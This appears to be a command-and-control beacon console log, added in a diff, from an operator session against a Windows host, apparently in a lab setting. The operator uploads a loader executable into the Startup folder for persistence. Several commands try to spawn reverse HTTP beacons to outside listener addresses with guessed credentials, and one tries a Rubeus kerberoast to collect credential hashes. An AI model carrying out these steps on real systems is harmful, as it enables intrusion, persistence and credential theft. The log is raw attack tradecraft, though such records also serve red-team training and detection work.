@@ -1,0 +1,38 @@
+01/06 08:51:15 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 7196; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/06 08:51:29 UTC [input] <neo> sleep 10
+01/06 08:51:29 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/06 08:52:14 UTC [checkin] host called home, sent: 16 bytes
+01/06 08:52:54 UTC [checkin] host called home, sent: 19 bytes
+01/06 08:53:04 UTC [checkin] host called home, sent: 35 bytes
+01/06 08:53:54 UTC [checkin] host called home, sent: 43 bytes
+01/06 08:54:04 UTC [checkin] host called home, sent: 98 bytes
+01/06 08:54:04 UTC [error] could not open C:\Users\NITRO5~1\Start Menu\*: 5
+01/06 08:54:34 UTC [checkin] host called home, sent: 51 bytes
+01/06 08:54:54 UTC [checkin] host called home, sent: 61 bytes
+01/06 08:55:04 UTC [checkin] host called home, sent: 69 bytes
+01/06 08:55:14 UTC [checkin] host called home, sent: 80 bytes
+01/06 08:55:24 UTC [checkin] host called home, sent: 89 bytes
+01/06 08:55:34 UTC [checkin] host called home, sent: 97 bytes
+01/06 08:55:44 UTC [input] <neo> upload /home/kali/Desktop/Shhhloader/a.exe (C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe)
+01/06 08:55:45 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/Shhhloader/a.exe as C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/06 08:55:45 UTC [indicator] file: 844fb84e402f77cd3b1e68ca58e86366 1216512 bytes C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/06 08:55:54 UTC [checkin] host called home, sent: 1046722 bytes
+01/06 08:56:04 UTC [checkin] host called home, sent: 170280 bytes
+01/06 08:56:14 UTC [checkin] host called home, sent: 202 bytes
+01/06 08:56:43 UTC [input] <neo> spawnas 1.0.0.0\hiuy 009260 company
+01/06 08:56:43 UTC [task] <T1078, T1093, T1106> Tasked beacon to spawn windows/beacon_http/reverse_http (193.168.88.146:90) as 1.0.0.0\hiuy
+01/06 08:56:44 UTC [checkin] host called home, sent: 263205 bytes
+01/06 08:56:45 UTC [error] could not run C:\Windows\system32\rundll32.exe as 1.0.0.0\hiuy: 1326
+01/06 08:57:54 UTC [input] <neo> spawnas .\Neo 12345 company
+01/06 08:57:54 UTC [task] <T1078, T1093, T1106> Tasked beacon to spawn windows/beacon_http/reverse_http (193.168.88.146:90) as .\Neo
+01/06 08:57:55 UTC [checkin] host called home, sent: 263197 bytes
+01/06 08:57:55 UTC [error] could not run C:\Windows\system32\rundll32.exe as .\Neo: 1326
+01/06 08:58:15 UTC [checkin] host called home, sent: 20 bytes
+01/06 08:58:25 UTC [checkin] host called home, sent: 28 bytes
+01/06 08:58:35 UTC [checkin] host called home, sent: 35 bytes
+01/06 08:58:55 UTC [checkin] host called home, sent: 80 bytes
+01/06 09:01:32 UTC [input] <neo> excute-assembly /root/Ghostpack-CompileBinaries/Rubeus.exe kerberoast /outline:hashes.txt
+01/06 09:01:32 UTC [error] Unknown command: excute-assembly /root/Ghostpack-CompileBinaries/Rubeus.exe kerberoast /outline:hashes.txt
+01/06 09:01:50 UTC [input] <neo> spawn
+01/06 09:01:53 UTC [task] <T1093> Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (192.168.255.128:80)
+01/06 09:01:55 UTC [checkin] host called home, sent: 263176 bytes
